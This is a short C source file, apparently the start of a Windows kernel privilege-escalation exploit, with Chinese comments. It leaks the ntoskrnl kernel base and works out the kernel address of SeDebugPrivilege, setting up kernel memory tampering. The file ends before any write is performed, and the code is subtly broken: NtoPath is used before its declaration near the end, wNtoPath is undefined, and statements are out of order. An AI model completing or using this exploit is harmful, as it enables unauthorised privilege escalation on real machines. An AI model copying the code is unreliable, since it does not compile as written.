
#include "ex.h"

#pragma comment(lib, "ntdll.lib")

DWORD64 NTOKernelBase;
HMODULE NTOUserBase;
DWORD64 SeDebugPrivilegeAddr;
DWORD64 SeDebugPrivilegeAddrOffset;

int main()
{

    OSVERSION OSVersion;
    GetFullOSVersion(&OSVersion);
    printf("[*] OS Version: %d.%d.%d.%d\n",
        OSVersion.MajorVersion, OSVersion.MinorVersion, OSVersion.BuildNumber, OSVersion.RevisionNumber);

    HANDLE hCurrentProc = GetCurrentProcess(); // 获取当前进程句柄
    DWORD CurrentPid = GetCurrentProcessId(); // 获取当前进程pid

    HMODULE ntdll = GetModuleHandleA("ntdll");
    if (ntdll == NULL) {
        return 0;
    }
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");

    NTOKernelBase = GetModuleAddrByName((LPCSTR)NtoPath); 
    printf("[+] ntoskrnl kernel base: %llx\n", NTOKernelBase);
    NTOUserBase = GetModuleByName(wNtoPath);
    printf("[+] ntoskrnl user base: %llx\n", (DWORD64)NTOUserBase);

    SeDebugPrivilegeAddrOffset = FindSeDebugPrivilegeOffset(NTOUserBase);
    printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);

    SeDebugPrivilegeAddr = NTOKernelBase + SeDebugPrivilegeAddrOffset;
    printf("[+] SeDebugPrivilege: %llx\n", SeDebugPrivilegeAddr);


    LPCSTR NtoPath = "\\SystemRoot\\system32\\ntoskrnl.exe";
    char ExpandedPath[MAXIMUM_FILENAME_LENGTH];
    // 展开环境变量，ExpandedPath 包含了完整的文件路径
    ExpandEnvironmentStrings(NtoPath, ExpandedPath, MAX_PATH);
}
